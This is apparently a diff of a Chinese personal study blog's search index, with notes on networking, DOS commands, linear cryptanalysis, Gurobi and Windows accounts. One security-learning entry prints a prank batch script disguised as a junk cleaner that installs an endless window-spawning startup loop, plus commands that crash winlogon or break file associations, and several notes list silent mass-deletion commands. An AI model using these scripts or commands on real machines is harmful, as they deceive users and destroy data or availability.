-<p><a href="https://www.bilibili.com/video/BV1v44y1g7Hf?p=1&amp;share_medium=iphone&amp;share_plat=ios&amp;share_session_id=791F56D7-CDA5-44B3-87C0-0ECC2828078D&amp;share_source=WEIXIN&amp;share_tag=s_i&amp;timestamp=1653636322&amp;unique_k=GzxogMD">什么是子网掩码</a></p>
-<p><a href="https://www.huaweicloud.com/zhishi/edits-15756158.html">ip地址和子网掩码的关系</a></p>
-</blockquote>
-<h2 id="网关（简单理解）"><a href="#网关（简单理解）" class="headerlink" title="网关（简单理解）"></a>网关（简单理解）</h2><p>相当于一个转换器，用于寻找要通信的另一方：</p>
-<p>pc向外发包</p>
-<p>1、首先判断目标IP与自己是否在 同一个网段</p>
-<p>2、如在同一个网段，则直接发出去，不找网关</p>
-<p>3、<strong>如不在同一个网段，则发包给网关</strong></p>
-<blockquote>
-<p>ping 命令：</p>
-<p>ping 目标IP地址                       #测试网络连通性，有去有回即为可以成功通路</p>
-<p>ping -t 目标IP地址                    #一直ping</p>
-<p>ping -n 数字 目标ip地址           #修改ping包的数量（默认4）</p>
-<p>ping -l 数字 目标ip地址            #修改ping 包的大小</p>
-<p>ipconfig      #查看ip基本信息</p>
-<p>ipconfig /all   #查看ip所有信息</p>
-</blockquote>
-<h2 id="DNS-域名系统-Domain-Name-System"><a href="#DNS-域名系统-Domain-Name-System" class="headerlink" title="DNS 域名系统 Domain Name System"></a>DNS 域名系统 <strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem</h2><p>它作为将<a href="https://baike.baidu.com/item/域名/86062">域名</a>和<a href="https://baike.baidu.com/item/IP地址/150859">IP地址</a>相互<a href="https://baike.baidu.com/item/映射/20402620">映射</a>的一个<a href="https://baike.baidu.com/item/分布式数据库/1238109">分布式数据库</a>，能够使人更方便地访问互联网</p>
-<blockquote>
-<p>手工解析域名</p>
-<p>nslookup www.baidu.com</p>
-</blockquote>
-<h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><blockquote>
-<p>cd..               返回上级目录</p>
-<p>cd\                返回根目录</p>
-<p>d:                 进入D盘</p>
-<p>cls                清空所有dos操作</p>
-<p>dir                显示当前盘符文件信息</p>
-<p>rd . /s/q        清空磁盘</p>
-<p><strong>浏览文件</strong></p>
-<p>type 文件名.扩展名                 显示</p>
-<p>type 文件名.扩展名 |more       分页显示</p>
-<p>例如：dir c:\windows |more</p>
-<p><strong>创建文件</strong></p>
-<p>md 文件夹名称                创建文件夹</p>
-<p>echo “内容”&gt;文件名         创建文件</p>
-<p><em>还要其他方式</em></p>
-<p><strong>删除文件</strong></p>
-<p>del *.txt                  删除所有txt结尾的文件</p>
-<p>del <em>.</em>                    删除文件</p>
-<p>del <em>.</em> /s/q             无提示删除</p>
-<p>attrib +h 文件名         隐藏文件夹</p>
-<p>attrib -h 文件名          取消文件夹</p>
-<p>attrib +h +s +a 文件名              将文件夹隐藏设为系统文件</p>
-<p>dir /a                          显示当前磁盘所有包括系统文件</p>
-<p>快速生成一个空文件（有大小）</p>
-<p>fsutil file createnew c:\system.ini 数字       在c盘创建文件指定文件大小</p>
-<p><strong>修改关联</strong></p>
-<p>参考：<a href="https://cloud.tencent.com/developer/news/682376">assoc 修改文件关联</a></p>
-<p>assoc .txt=exefile         修改打开txt文件的程序 使其无法打开</p>
-<p>assoc .txt=txtfile           恢复</p>
-<p>(未成功)</p>
-<p><strong>shutdown</strong></p>
-<p>shutdown -s -t 100 定时关机</p>
-<p>shutdown -s -f -t 100 定时强制关机</p>
-<p>shutdown -r -t 秒 定时重启</p>
-<p>shutdown -a 取消定时</p>
-<p>shutdown -l 注销，同logoff命令相同</p>
-<p>shutdown -s -f -t 100 -c “haah”</p>
-<p><strong>文件操作</strong></p>
-<p>ren 旧名 新名                      重命名</p>
-<p>move 原地址 新地址           移动</p>
-<p>copy 原地址 目的地址         复制粘贴</p>
+<ol>
+<li><p>固定掩码 $\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)\$ ;</p>
+</li>
+<li><p>假设关系式 $(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)$ 成立的概率位 $2/16$，则不成立概率 $14/16$ ；</p>
+</li>
+<li><p>假设，密钥关系 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 对 N 个明密文对计算  $(\alpha \cdot m) \oplus (\beta \cdot c)$ ，将预计得到 $2N/16$ 个 1 和  $14N/16$ 个 0，即 $T_0 = \frac{2N}{16}\ and\ T_1 = \frac{14N}{16}$ </p>
+</li>
+<li><p>如果 3. 的计数器满足上面所述，则可以猜测  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 是正确的，否则，其是错误的，也就是  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0$ （这种情况 $T_0$ 和 $T_1$ 的计数应该差不多和 3. 相反）；</p>
+</li>
+<li>如果 3. 的计数器满足上述，就可获得密钥信息  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1\ \ i.e.\ \ k_{0,0}\oplus k_{0,3} \oplus k_{1,2} = 1$ ；</li>
+<li>继续寻找更多关系来尽可能多的恢复密钥比特。</li>
+</ol>
 </blockquote>
 ]]></content>
       <categories>
-        <category>CS</category>
+        <category>Cryptanalysis</category>
       </categories>
       <tags>
-        <tag>CS_OP</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -476,645 +1115,6 @@ The\;end</script>]]></content>
       <categories>
         <category>Cryptanalysis</category>
       </categories>
-      <tags>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linear Cryptanalysis</title>
-    <url>/2022/05/25/Cryptanalysis/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h1 id="线性分析"><a href="#线性分析" class="headerlink" title="线性分析"></a>线性分析</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>线性分析通过寻找明密文与密钥间的线性相关性，构造可能产生线性偏差的掩码（搜索）来构造尽量大的线性逼近，从而逐比特的获取密钥信息。</p>
-<p>$Example\ 1$</p>
-<p>最简单的例子：$plaintext\ m,\ ciphertext\ c,\ key\ k = b\ bits$ ，密码系统 $c = m \oplus k$ ，显然该密码系统在不是一次一密的情况下是不安全的，但现在从另一个方面考虑：</p>
-<p>如果逐比特考虑这该密码系统的 3 个变量，则对应比特也满足关系 $c_i = m_i \oplus k_i$ ，$_i$ 表示对应的比特位。那么对于已知明文攻击，就可以通过 $k_i = m_i \oplus c_i$ 来计算获得 $k_i$ 的每一个比特，并还原成 $k$ .这是一种通过明密文的线性关系来逐比特恢复密钥的一个最简单实例，但其并没有较强的说服力.</p>
-<p>$Example\ 2$</p>
-<p>考虑一个稍微复杂的加密系统，密文比特由部分明文比特和密钥比特确定：同样可以通过直接逐比特的写出明密文与密钥的关系来恢复密钥</p>
-<script type="math/tex; mode=display">
-\begin{aligned}
-c_{3} &=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0} \\
-c_{2} &=m_{2} \oplus m_{0} \oplus k_{2} \oplus k_{0} \\
-c_{1} &=m_{3} \oplus m_{2} \oplus k_{3} \oplus k_{2}, \text { and } \\
-c_{0} &=m_{1} \oplus m_{0} \oplus k_{1} \oplus k_{0}\\
-i.e.\\
-k_{0} &=m_{0} \oplus c_{0} \oplus c_{3} \\
-k_{1} &=m_{1} \oplus c_{0} \oplus c_{2} \oplus c_{3} \\
-k_{2} &=m_{2} \oplus c_{1} \oplus c_{1} \oplus c_{2}, \text { and } \\
-k_{3} &=m_{3} \oplus c_{0} \oplus c_{1} \oplus c_{2} \oplus c_{3}
-\end{aligned}\\</script><h2 id="CIPHER-A："><a href="#CIPHER-A：" class="headerlink" title="CIPHER_A："></a>CIPHER_A：</h2><p>现在考虑密码系统 CIPHER_A：其中变量均为 4 bits，密钥 8 bits，记为 $k_0||k_1$ ，</p>
-<p><img src="https://ossimg.yzitc.com/2022/05/23/20c5c34e70f97.png"></p>
-<p>该密码系统满足如下关系：$u=m \oplus k_{0}, v=S[u] \text {, and } c=v \oplus k_{1} \text {. }$ 现在需要找到合适的密钥使得 $v=S[u]$ ，试图通过逐比特的恢复密钥，如何能够逐比特的考虑明密文及密钥？将其都做为列向量来考虑，并且用一个行向量来当作<strong>掩码</strong>，表示取或不取该比特：</p>
-<script type="math/tex; mode=display">
-(1,0,0,0) \times\left(\begin{array}{c}
-m_{3} \\
-m_{2} \\
-m_{1} \\
-m_{0}
-\end{array}\right)=m_{3} \text {, and }(0,0,1,0) \times\left(\begin{array}{c}
-m_{3} \\
-m_{2} \\
-m_{1} \\
-m_{0}
-\end{array}\right)=m_{1}</script><p>那么上述的 $Example\ 2$ 就可以表示为：（掩码随机取的，× 表示数量积）</p>
-<script type="math/tex; mode=display">
-(1,0,1,1) \times\left(\begin{array}{l}
-m_{3} \\
-m_{2} \\
-m_{1} \\
-m_{0}
-\end{array}\right) \oplus(1,0,1,1) \times\left(\begin{array}{l}
-k_{3} \\
-k_{2} \\
-k_{1} \\
-k_{0} \\
-\end{array}\right)=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
-i.e.\ \ \ c_{3}=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
-i.e.\ \ \ \alpha \cdot c=\beta \cdot m \oplus \beta \cdot k\ \ where\ \alpha=(1,0,0,0) \text { and } \beta=(1,0,1,1)</script><p>也即，可以通过掩码表示明密文相应位和密钥的线性关系（或进行一定的线性变化），掩码为 $\alpha\ and\ \beta$ . 但是仅仅线性的关系对上图的 CIPHER_A 是没有用的，因为存在非线性的 S-box，所以自然的考虑能否通过统计特性，使其逼近该密码系统中的非线性函数，即 S-box ？关系为 $\alpha \cdot x = \beta \cdot S[x]$（注意这里的结果是 0 或 1） 对于一个理想的非线性函数，无论使用任何掩码，该关系满足与否的概率为 $1/2$ ，那又很自然的想到，希望通过穷搜所有掩码来使关系满足的概率偏离 $1/2$ ，即存在<strong>偏差</strong> 。</p>
-<p>以上密码使用掩码表示，并计算其已知偏差：</p>
-<script type="math/tex; mode=display">
-\begin{array}{l}
-(\alpha \cdot m)=\left(\alpha \cdot k_{0}\right) \oplus(\alpha \cdot u) \text { with probability } 1\\
-(\alpha \cdot u)=(\beta \cdot v) \quad \text { with probability } p\\
-(\beta \cdot v)=\left(\beta \cdot k_{1}\right) \oplus(\beta \cdot c) \text { with probability } 1 .
-\end{array}</script><p>只需要考虑中间的式子，进一步，将左边式子和右边式子相乘得到关于明密文及密钥的（化简过）（掩码位）关系式：</p>
-<script type="math/tex; mode=display">
-(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right) \text { with probability } p \text {. }</script><p>也就是，在直到明密文对的情况下，找到  $\alpha \cdot x = \beta \cdot S[x]$ 关系式的相关信息，就能获得关于密钥的信息。</p>
-<p>如果 $p \ne 1/2$ 即存在偏差，那么就有可能在一定的数据量内获得关于密钥的信息，假设 $p = 1/2 + \varepsilon$ ，则 $0&lt;|\boldsymbol{\varepsilon}| \leq \frac{1}{2}$ 为线性偏差，当然会期望偏差尽量大，因为偏差越大就需要越少的数据量。 </p>
-<p>举例对上述非线性关系式  $\alpha \cdot x = \beta \cdot S[x]$ 的简单线性攻击（这里的 x 满足上述 CIPHER_A的 u 或 v)：</p>
-<p><strong>建立区分器</strong></p>
-<ol>
-<li>穷举所有 $x$ ，并计算 $S[x]$ ;</li>
-<li>对所有的 $x\ and\ S[x]$ 穷举所有掩码 $\alpha\ and\ \beta$ ；</li>
-<li>算出 $\alpha \cdot x = \beta \cdot S[x]$ 的概率（或 $\alpha \cdot x \oplus 1= \beta \cdot S[x]$ 的概率）； </li>
-</ol>
-<p>例子：$p(\alpha \cdot x = \beta \cdot S[x]) = 2/16\ \ and\ \ p(\alpha \cdot x \oplus 1= \beta \cdot S[x]) = 14/16$ </p>
-<p>$i.e.\ \ \ \  p((\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right))=14/16$ </p>
-<script type="math/tex; mode=display">
-\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)</script><script type="math/tex; mode=display">
-\begin{array}{|c|cccccccccccccccc|}
-\hline \mathrm{x} & 0 & 1 & 2 & 3 & 4 & 5 & 6 & 7 & 8 & 9 & \mathrm{a} & \mathrm{b} & \mathrm{c} & \mathrm{d} & \mathrm{e} & \mathrm{f} \\
-\hline \mathrm{S}[\mathrm{x}] & \mathrm{f} & \mathrm{e} & \mathrm{b} & \mathrm{c} & 6 & \mathrm{~d} & 7 & 8 & 0 & 3 & 9 & \mathrm{a} & 4 & 2 & 1 & 5 \\
-\hline \hline \alpha \cdot x & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 0 \\
-\hline \beta \cdot S[x] & 1 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 0 \\
-\hline
-\end{array}</script><p>为了表述清楚：二元域内的运算和比较（module 2）</p>
-<script type="math/tex; mode=display">
-\alpha \cdot x = \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{2}{16}</script><script type="math/tex; mode=display">
-\alpha \cdot x \ne \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{14}{16}</script><p><strong>恢复密钥</strong></p>
-<ol>
-<li><p>设置计数器 $T_0\ and\ T_1$ ，固定掩码 $\alpha\ and\ \beta$ ，使用多对明密文进行测试，计算 $(\alpha \cdot m) \oplus (\beta \cdot c)$ ：</p>
-<p>为 1 ，$T_1$ 计数器＋1</p>
-<p>为 0 ，$T_0$ 计数器 + 1</p>
-<p>（注意这里使用的明密文对数量和偏差的大小有关）</p>
-</li>
-<li><p>可以先假设密钥值，观察两个计数器，可以获得 $(\alpha \cdot m) \oplus (\beta \cdot c)$ 的值（ 0 或 1）的分布，再根据相等与否的概率得出密钥信息 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0\ or\ 1$ </p>
-<p>注意，并不能确定的获取密钥在该位的取值，只是获取掩码对应的几位之间的信息。</p>
-</li>
-</ol>
-<p>例子：</p>
-<blockquote>
-<ol>
-<li><p>固定掩码 $\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)\$ ;</p>
-</li>
-<li><p>假设关系式 $(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)$ 成立的概率位 $2/16$，则不成立概率 $14/16$ ；</p>
-</li>
-<li><p>假设，密钥关系 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 对 N 个明密文对计算  $(\alpha \cdot m) \oplus (\beta \cdot c)$ ，将预计得到 $2N/16$ 个 1 和  $14N/16$ 个 0，即 $T_0 = \frac{2N}{16}\ and\ T_1 = \frac{14N}{16}$ </p>
-</li>
-<li><p>如果 3. 的计数器满足上面所述，则可以猜测  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1$ 是正确的，否则，其是错误的，也就是  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0$ （这种情况 $T_0$ 和 $T_1$ 的计数应该差不多和 3. 相反）；</p>
-</li>
-<li>如果 3. 的计数器满足上述，就可获得密钥信息  $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=1\ \ i.e.\ \ k_{0,0}\oplus k_{0,3} \oplus k_{1,2} = 1$ ；</li>
-<li>继续寻找更多关系来尽可能多的恢复密钥比特。</li>
-</ol>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Cryptanalysis</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安学习-D-3-批处理，脚本，过时小病毒</title>
-    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/</url>
-    <content><![CDATA[<p>环境：win2003 虚拟机</p>
-<p>只做简单了解，并不深究…</p>
-<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
-<p>使用的是 <a href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
-<p><strong>发布博客的批处理文件</strong></p>
-<p>我自己的：</p>
-<ol>
-<li>push</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
-<ol>
-<li>check</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
-<p>3.NewBlog</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
-<p><strong>一个小例子</strong></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
-<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
-<p>如：</p>
-<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
-<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
-<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
-<p>参考：</p>
-<p><a href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
-<p><a href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
-<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
-<ul>
-<li>添加 开机自启动项，无限弹窗</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
-<p>ntsd    ：杀死进程</p>
-<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
-<p>winlogon.exe    ：<a href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
-<ul>
-<li>修改文件关联，使无法打开（前一章写过）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CS</category>
-      </categories>
-      <tags>
-        <tag>CS_OP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Gurobi_1_ex_mip1</title>
-    <url>/2022/05/30/Gurobi/Gurobi-1-ex-mip1/</url>
-    <content><![CDATA[<h1 id="ex-mip1"><a href="#ex-mip1" class="headerlink" title="ex_mip1"></a>ex_mip1</h1><h2 id="求解问题"><a href="#求解问题" class="headerlink" title="求解问题"></a>求解问题</h2><script type="math/tex; mode=display">
-\begin{array}{cl}
-\max & x+y+2 z \\
-\text { s.t. } & x+2 y+3 z \leq 4 \\
-& x+y \geq 1 \\
-& x, y, z \in\{0,1\}
-\end{array}</script><h2 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gurobipy</span><br><span class="line"><span class="keyword">from</span> gurobipy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#需要对出错情况进行反馈，所以用 try</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#建一个模型</span></span><br><span class="line">    m = gurobipy.Model(<span class="string">&quot;mip1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Model=&#x27;</span>,m)   <span class="comment">#Model= &lt;gurobi.Model Continuous instance mip1: 0 constrs, 0 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义变量</span></span><br><span class="line">    x = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">    y = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;y&quot;</span>)</span><br><span class="line">    z = m.addVar(vtype=GRB.BINARY, name=<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#目标函数</span></span><br><span class="line">    m.setObjective(x+y+<span class="number">2</span>*z, GRB.MAXIMIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#约束条件</span></span><br><span class="line">    m.addConstr(x+<span class="number">2</span>*y+<span class="number">3</span>*z &lt;= <span class="number">4</span>, <span class="string">&#x27;c0&#x27;</span>)</span><br><span class="line">    m.addConstr(x+y &gt;= <span class="number">1</span>, <span class="string">&#x27;c1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#优化模型</span></span><br><span class="line">    m.optimize()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;new_Model=&#x27;</span>, m)  <span class="comment">#new_Model= &lt;gurobi.Model MIP instance mip1: 2 constrs, 3 vars, No parameter changes&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> m.getVars():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s %g&#x27;</span> % (v.VarName, v.X))</span><br><span class="line">    <span class="comment">#x 1</span></span><br><span class="line">    <span class="comment">#y 0</span></span><br><span class="line">    <span class="comment">#z 1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Obj: %g&#x27;</span> % m.ObjVal) <span class="comment">#Obj: 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> gurobipy.GurobiError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error code &#x27;</span> + <span class="built_in">str</span>(e.errno) + <span class="string">&#x27;: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> AttributeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Encountered an attribute error&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>参考：</p>
-<p><a href="https://blog.csdn.net/WASEFADG/article/details/105261808">https://blog.csdn.net/WASEFADG/article/details/105261808</a></p>
-]]></content>
-      <categories>
-        <category>MILP_Learning</category>
-      </categories>
-      <tags>
-        <tag>Gurobi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安学习-D-4-用户，组管理</title>
-    <url>/2022/05/29/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-4-%E7%94%A8%E6%88%B7%EF%BC%8C%E7%BB%84%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>每个用户有自己唯一的 SID（安全标识符），window 系统，通过命令 ：<code>wmic useraccount get name,sid</code> 查看</p>
-<blockquote>
-<p>windows 管理员 administrator 的 UID 是 500，普通用户 1000 开始</p>
-<p>linux 管理员 root 的UID是 0 ，普通用户是1000开始</p>
-</blockquote>
-<p><img src="https://ossimg.yzitc.com/2022/05/29/15a458e7e437a.png"></p>
